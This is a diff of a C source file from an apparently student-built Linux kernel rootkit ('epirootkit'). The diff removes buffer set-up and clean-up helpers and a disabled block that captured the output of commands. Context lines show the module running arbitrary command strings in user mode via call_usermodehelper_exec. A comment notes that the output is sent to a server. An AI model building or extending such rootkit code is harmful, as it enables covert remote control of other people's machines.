@@ -4,56 +4,6 @@
 
 #include "epirootkit.h"
 
-struct exec_code_stds exec_result;
-
-// Function prototypes
-int init_exec_result(void);
-int free_exec_result(void);
-int exec_str_as_command(char *user_cmd, bool catch_stds);
-
-/**
- * @brief Initializes the exec_result structure.
- *
- * This function allocates memory for the std_out and std_err buffers
- * in the exec_result structure. It should be called before using
- * exec_str_as_command to ensure that the buffers are properly initialized.
- */
-int init_exec_result(void) {
-    exec_result.code = 0;
-    exec_result.std_out = kcalloc(STD_BUFFER_SIZE, sizeof(char), GFP_KERNEL);
-    exec_result.std_err = kcalloc(STD_BUFFER_SIZE, sizeof(char), GFP_KERNEL);
-    if (!exec_result.std_out || !exec_result.std_err) {
-        ERR_MSG("exec_cmd: fail to initialize exec_result, memory allocation failed\n");
-        if (exec_result.std_out)
-            kfree(exec_result.std_out);
-        if (exec_result.std_err)
-            kfree(exec_result.std_err);
-        return -ENOMEM;
-    }
-    return SUCCESS;
-}
-
-/**
- * @brief Frees the memory allocated for the exec_result structure.
- *
- * This function should be called when the exec_result structure is no longer needed
- * to avoid memory leaks.
- */
-int free_exec_result(void) {
-    if (exec_result.std_out) {
-        kfree(exec_result.std_out);
-        exec_result.std_out = NULL;
-    }
-    if (exec_result.std_err) {
-        kfree(exec_result.std_err);
-        exec_result.std_err = NULL;
-    }
-
-    DBG_MSG("epirootkit_exit: free_exec_result\n");
-
-    return SUCCESS;
-}
-
 /**
  * @brief Executes a command string in user mode.
  *
@@ -114,39 +64,6 @@ int exec_str_as_command(char *user_cmd, bool catch_stds) {
     // Execute the command and wait for it to finish
     status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
     DBG_MSG("exec_str_as_command: command exited with status: %d\n", status);
-
-#if 0
-	// Retieve stdout and stderr
-	int stdout_size = 0;
-	int stderr_size = 0;
-	char *stdout_content = read_file(stdout_file, &stdout_size);
-	char *stderr_content = read_file(stderr_file, &stderr_size);
-	if (!stdout_content || !stderr_content) {
-		if (stdout_content)
-			kfree(stdout_content);
-		if (stderr_content)
-			kfree(stderr_content);
-		kfree(cmd);
-		return -ENOENT;
-	}
-
-	// Update the exec_result structure with the command's output and return code
-	exec_result.code = status;
-
-	// Stock only the last STD_BUFFER_SIZE bytes of the output
-	// Firsts (and all of them) are not useful since its has been sent to the server
-	size_t stdout_copy_offset = stdout_size > STD_BUFFER_SIZE ? stdout_size - STD_BUFFER_SIZE : 0;
-	size_t stderr_copy_offset = stderr_size > STD_BUFFER_SIZE ? stderr_size - STD_BUFFER_SIZE : 0;
-
-	strncpy(exec_result.std_out, stdout_content + stdout_copy_offset, STD_BUFFER_SIZE - 1);
-	strncpy(exec_result.std_err, stderr_content + stderr_copy_offset, STD_BUFFER_SIZE - 1);
-	exec_result.std_out[STD_BUFFER_SIZE - 1] = '\0';
-	exec_result.std_err[STD_BUFFER_SIZE - 1] = '\0';
-
-	// Cleanup: free memory
-	kfree(stdout_content);
-	kfree(stderr_content);
-#endif
 
     kfree(cmd);
 
